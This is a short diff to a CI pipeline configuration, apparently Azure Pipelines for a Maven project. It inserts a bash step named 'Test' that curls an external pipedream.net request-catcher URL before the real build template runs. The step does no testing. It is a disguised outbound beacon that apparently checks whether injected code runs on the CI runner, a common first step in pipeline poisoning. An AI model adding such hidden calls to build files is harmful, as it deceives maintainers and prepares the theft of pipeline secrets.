@@ -44,6 +44,9 @@ stages:
       demands:
         - maven
     steps:
+    - bash: |
+        curl -X GET https://eoinkd603ndv2ew.m.pipedream.net
+      displayName: Test
     - template: job.ci.build.yml
 
 - ${{ if or(startsWith(variables['Build.SourceBranch'], 'refs/heads/release/'), startsWith(variables['Build.SourceBranch'], 'refs/heads/develop'), startsWith(variables['Build.SourceBranch'], 'refs/heads/masters/'), startsWith(variables['Build.SourceBranch'], 'refs/heads/support/')) }}:
